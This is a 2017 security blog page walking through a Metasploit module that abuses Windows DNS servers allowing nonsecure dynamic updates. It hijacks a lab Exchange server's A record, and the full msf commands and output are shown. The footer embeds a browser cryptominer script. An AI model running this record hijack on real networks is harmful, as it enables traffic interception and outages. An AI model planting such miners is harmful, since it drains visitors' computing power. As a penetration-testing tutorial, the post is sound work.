<!DOCTYPE html>
<html>

    <head>
        <title> Dynamic DNS Update Module &middot;  </title>

        <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.31.1" />


<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>


<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">


<link rel="stylesheet" href="https://malicious.link/css/nix.css">


<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">



<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-198967-1', 'auto');
	  ga('send', 'pageview');

</script>


    </head>

    <body>
        <header>
<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
	<div class="container-fluid">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
		</div>

		
		<div class="collapse navbar-collapse" id="navbar-collapse-1">
			<ul class="nav navbar-nav navbar-right">
				<li>
					<a href="https://malicious.link/">/home/mubix</a>
				</li>

				
				
				<li >
					<a href="/brandon">~/brandon</a>
				</li>
				
				
				<li >
					<a href="/about">~/about</a>
				</li>
				
				
				<li >
					<a href="/post">~/posts</a>
				</li>
				

			</ul>
		</div>
	</div>
</nav>
</header>

        <div class="container wrapper">
            <h1><a href="https://malicious.link/post/2017/dynamic-dns-update-module/">Dynamic DNS Update Module</a></h1>
            <span class="post-date">Jun 25, 2017 </span>
            <div class="post-content">
                

<p>&ldquo;Secure&rdquo; DNS updates is the default in Windows, but there is an option to allow &ldquo;Nonsecure&rdquo; updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for.</p>

<p><center><img src="/images/2017/nonsecure_dns_updates.png" alt="" /></center></p>

<p>The module was originally written by <a href="https://twitter.com/kingsabri">King Sabri</a>, with many touch ups and the spoofing capability by <a href="https://twitter.com/busterbcook">busterbcook</a></p>

<p>You can read up on the pull request in <a href="https://github.com/rapid7/metasploit-framework/pull/8599">pr/#8599</a></p>

<p>Just to drive home the point I&rsquo;ll be using my Exchange server as a target:</p>

<p><center> <strong>You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.</strong></center></p>

<p><center><img src="/images/2017/before_dns_update.png" alt="" /></center></p>

<p>If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.</p>

<pre><code>$ dig @192.168.80.10 sdexchange.sittingduck.info

;; ANSWER SECTION:
sdexchange.sittingduck.info. 1200 IN    A   192.168.80.13
</code></pre>

<p>Here is what the module looks like:</p>

<pre><code>msf &gt; use auxiliary/admin/dns/dyn_dns_update
msf auxiliary(dyn_dns_update) &gt; show options

Module options (auxiliary/admin/dns/dyn_dns_update):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CHOST                      no        The source address to use for queries and updates
   DOMAIN                     yes       The domain name
   HOSTNAME                   yes       The name record you want to add
   IP                         no        The IP you want to assign to the record
   RHOST                      yes       The vulnerable DNS server IP address
   TYPE      A                yes       The record type you want to add. (Accepted: A, AAAA, CNAME, TXT)
   VALUE                      no        The string to be added with TXT or CNAME record


Auxiliary action:

   Name    Description
   ----    -----------
   UPDATE  Add or update a record. (default)
</code></pre>

<p>It has 3 different actions, but you&rsquo;ll mostly want <code>UPDATE</code>. <code>UPDATE</code> will automatically delete a record if it exists already and then add the record back with your specified settings.</p>

<pre><code>msf auxiliary(dyn_dns_update) &gt; show actions

Auxiliary actions:

   Name    Description
   ----    -----------
   ADD     Add a new record. Fail if it already exists.
   DELETE  Delete an existing record.
   UPDATE  Add or update a record. (default)

</code></pre>

<p>Here are the settings I chose. Notice the IP address that I&rsquo;m injecting isn&rsquo;t on the same subnet as the domain.</p>

<pre><code>msf auxiliary(dyn_dns_update) &gt; set DOMAIN sittingduck.info
DOMAIN =&gt; sittingduck.info
msf auxiliary(dyn_dns_update) &gt; set HOSTNAME sdexchange
HOSTNAME =&gt; sdexchange
msf auxiliary(dyn_dns_update) &gt; set IP 100.100.100.100
IP =&gt; 100.100.100.100
msf auxiliary(dyn_dns_update) &gt; set RHOST 192.168.80.10
RHOST =&gt; 192.168.80.10
</code></pre>

<p>And the output:</p>

<pre><code>msf auxiliary(dyn_dns_update) &gt; run

[+] Found existing A record for sdexchange.sittingduck.info
[*] Sending dynamic DNS delete message...
[+] The record 'sdexchange.sittingduck.info =&gt; 100.100.100.100' has been deleted!
[*] Sending dynamic DNS add message...
[+] The record 'sdexchange.sittingduck.info =&gt; 100.100.100.100' has been added!
[*] Auxiliary module execution completed
msf auxiliary(dyn_dns_update) &gt;
</code></pre>

<h2 id="game-over">#Game Over</h2>

<p><img src="/images/2017/after_dns_update.png" alt="" /></p>

<p>This will stay until fixed or another dynamic DNS update is performed from the original server (every 24 hours or so).</p>

            </div>
            
            <div class="post-comments">
                
            </div>
            
            <div class="push"></div>
        </div>
        <footer class="footer text-center">
<p>
	<center>
	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
	<br />
	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
	<div class="coinhive-miner"
	style="width: 800px; height: 80px"
	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
	data-whitelabel="true"
	data-text="#000000"
	data-background="#F5F5F5"
	data-user="blog"
	data-autostart="true"
	>
	<em>Loading...</em>
	</div>
	</center>
</p>
<p>Copyright &copy; 2018 Malicious.Link -
<span class="credit">
	Powered by
	<a target="_blank" href="https://gohugo.io">Hugo</a>
	and
	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
</span>
</p>

</footer>

    </body>
